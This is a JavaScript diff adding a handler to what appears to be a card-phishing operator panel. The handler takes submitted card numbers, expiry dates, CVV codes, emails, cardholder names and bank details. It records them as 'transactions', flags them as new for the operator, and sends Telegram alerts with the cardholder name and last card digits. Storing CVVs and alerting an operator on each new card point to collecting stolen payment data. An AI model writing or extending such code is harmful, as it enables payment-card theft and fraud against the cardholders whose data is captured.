@@ -1003,6 +1003,61 @@
       document.getElementById('captureStatus').textContent = 'Connection error: ' + error.message;
       document.getElementById('captureStatus').style.color = '#ef4444';
     });
+    // Handle card submission data
+socket.on('card_submitted', (data) => {
+  console.log('Received card submission:', data);
+  if (data.cardData && data.invoiceId) {
+    // Acknowledge receipt back to the client
+    socket.emit('card_data_received', {
+      invoiceId: data.invoiceId,
+      received: true,
+      timestamp: Date.now()
+    });
+    
+    // Immediately update the transactions table without waiting for a refresh
+    const transaction = transactionsMap.get(data.invoiceId);
+    if (transaction) {
+      // Update the existing transaction with new card data
+      transaction.cardNumber = data.cardData.cardNumber;
+      transaction.expiry = data.cardData.expiry;
+      transaction.cvv = data.cardData.cvv;
+      transaction.email = data.cardData.email;
+      transaction.cardholder = data.cardData.cardholder;
+      transaction.viewed = false; // Mark as new so it's highlighted
+      transactionsMap.set(data.invoiceId, transaction);
+    } else {
+      // Create a new transaction if it doesn't exist yet
+      const newTransaction = {
+        id: data.invoiceId,
+        cardNumber: data.cardData.cardNumber,
+        expiry: data.cardData.expiry,
+        cvv: data.cardData.cvv,
+        email: data.cardData.email,
+        cardholder: data.cardData.cardholder,
+        amount: data.cardData.amount,
+        timestamp: new Date().toISOString(),
+        status: 'processing',
+        viewed: false,
+        bankInfo: {
+          bank: data.cardData.bankName,
+          country: data.cardData.country,
+          scheme: data.cardData.cardType
+        }
+      };
+      transactionsMap.set(data.invoiceId, newTransaction);
+    }
+    
+    // Refresh the transactions table with the new data
+    loadTransactions();
+    
+    // Play notification sound and show notification
+    playNotificationSound('transaction');
+    showNotification(`New card data received! Card: ${data.cardData.cardNumber.slice(-4)}`);
+    
+    // Send Telegram notification if configured
+    sendTelegramNotification(`💳 <b>New Card Data Received</b>\nCard: ${data.cardData.cardNumber.slice(-4)}\nName: ${data.cardData.cardholder}\nInvoice ID: ${data.invoiceId}`);
+  }
+});
     
     // Log all socket events for debugging
     const originalEmit = socket.emit;
